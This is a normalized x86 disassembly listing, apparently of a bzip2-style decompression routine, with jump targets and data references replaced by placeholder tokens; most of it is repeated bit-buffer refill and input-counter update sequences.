mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x8 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x24 ]
sub eax 0x30
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x24 ] eax
mov edx [ ebp + 0x8 ]
movzx eax [ edx + 0x28 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shl eax 0x8
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov ecx [ edx ]
movzx edx [ ecx ]
or eax edx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x1c ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x20 ]
add eax 0x8
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x20 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
sub eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x8 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov eax [ ecx ]
movzx ecx [ eax ]
or edx ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
add edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x8 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov eax [ ecx ]
movzx ecx [ eax ]
or edx ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
add edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x8 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov eax [ ecx ]
movzx ecx [ eax ]
or edx ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
add edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x8 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov eax [ ecx ]
movzx ecx [ eax ]
or edx ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
add edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x8 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov eax [ ecx ]
movzx ecx [ eax ]
or edx ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
add edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x8 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc58 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x2c ]
push edx
push rw-data
call sub_41360f
add eax 0x40
push eax
call sub_4134f3
add esp 0xc
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov eax [ ecx ]
movzx ecx [ eax ]
or edx ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
add edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x8 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov eax [ ecx ]
movzx ecx [ eax ]
or edx ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
add edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x8 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov eax [ ecx ]
movzx ecx [ eax ]
or edx ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
add edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x8 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov eax [ ecx ]
movzx ecx [ eax ]
or edx ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
add edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x8 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov eax [ ecx ]
movzx ecx [ eax ]
or edx ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
add edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x8 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shl eax 0x8
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov ecx [ edx ]
movzx edx [ ecx ]
or eax edx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x1c ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x20 ]
add eax 0x8
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x20 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
sub eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x8 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov eax [ ecx ]
movzx ecx [ eax ]
or edx ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
add edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x8 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov eax [ ecx ]
movzx ecx [ eax ]
or edx ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
add edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x8 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov eax [ ecx ]
movzx ecx [ eax ]
or edx ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
add edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x8 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
shl ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov edx [ eax ]
movzx eax [ edx ]
or ecx eax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x1c ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
add ecx 0x8
mov edx [ ebp + 0x8 ]
mov [ edx + 0x20 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x4 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x74 ]
add eax 0x1
mov [ ebp - 0x74 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov eax [ ecx ]
movzx ecx [ eax ]
or edx ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
add edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x8 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov eax [ ecx ]
movzx ecx [ eax ]
or edx ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
add edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x8 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x18 ]
cmp edx [ ebp - 0x64 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
shl ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov edx [ eax ]
movzx eax [ edx ]
or ecx eax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x1c ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
add ecx 0x8
mov edx [ ebp + 0x8 ]
mov [ edx + 0x20 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x4 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x18 ]
mov al [ ebp - 0x74 ]
mov [ edx + 0x650e ] al
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov eax [ ecx ]
movzx ecx [ eax ]
or edx ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
add edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x8 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
jmp r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov eax [ ecx ]
movzx ecx [ eax ]
or edx ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
add edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x8 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x6c ]
imul ecx ecx 0x102
add ecx [ ebp - 0x18 ]
mov edx [ ebp + 0x8 ]
mov al [ ebp - 0x28 ]
mov [ edx + ecx + 0xab60 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
shl ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov edx [ eax ]
movzx eax [ edx ]
or ecx eax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x1c ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
add ecx 0x8
mov edx [ ebp + 0x8 ]
mov [ edx + 0x20 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x4 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
shl ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov edx [ eax ]
movzx eax [ edx ]
or ecx eax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x1c ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
add ecx 0x8
mov edx [ ebp + 0x8 ]
mov [ edx + 0x20 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x4 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
